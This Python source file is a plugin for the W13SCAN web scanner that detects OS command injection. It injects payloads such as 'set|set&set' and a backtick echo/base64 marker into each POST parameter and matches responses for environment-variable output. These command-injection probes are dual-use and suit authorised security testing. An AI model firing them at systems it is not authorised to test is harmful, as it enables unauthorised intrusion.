#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/7/7 2:32 PM
# @Author  : w8ay
# @File    : post_command_system.py

import copy
import random
import re

import requests

from W13SCAN.lib.const import ignoreParams, POST_HINT, Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase


class W13SCAN(PluginBase):
    name = '系统命令注入 POST插件'
    desc = '''测试系统命令注入，支持Windows/Linux,暂只支持Get请求方式和回显型的命令注入'''
    level = Level.HIGHT

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL

        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        post_hint = self.requests.post_hint
        post_data = self.requests.post_data

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        if method == 'POST':

            if post_hint == POST_HINT.NORMAL:
                randint = random.randint(1000, 9000)
                url_flag = {
                    "set|set&set": [
                        'Path=[\s\S]*?PWD=',
                        'Path=[\s\S]*?PATHEXT=',
                        'Path=[\s\S]*?SHELL=',
                        'Path\x3d[\s\S]*?PWD\x3d',
                        'Path\x3d[\s\S]*?PATHEXT\x3d',
                        'Path\x3d[\s\S]*?SHELL\x3d',
                        'SERVER_SIGNATURE=[\s\S]*?SERVER_SOFTWARE=',
                        'SERVER_SIGNATURE\x3d[\s\S]*?SERVER_SOFTWARE\x3d',
                        'Non-authoritative\sanswer:\s+Name:\s*',
                        'Server:\s*.*?\nAddress:\s*'
                    ],
                    "echo `echo 6162983|base64`6162983".format(randint): [
                        "NjE2Mjk4Mwo=6162983"
                    ]
                }
                for k, v in post_data.items():
                    if k.lower() in ignoreParams:
                        continue
                    data = copy.deepcopy(post_data)
                    for spli in ['', ';']:
                        for flag, re_list in url_flag.items():
                            if spli == "":
                                data[k] = flag
                            else:
                                data[k] = v + spli + flag
                            r = requests.post(url, data=data, headers=headers)
                            html1 = r.text
                            for rule in re_list:
                                if re.search(rule, html1, re.I | re.S | re.M):
                                    out.success(url, self.name, payload="{}:{}".format(k, data[k]), method=method,
                                                data=str(data), raw=r.raw)
                                    break
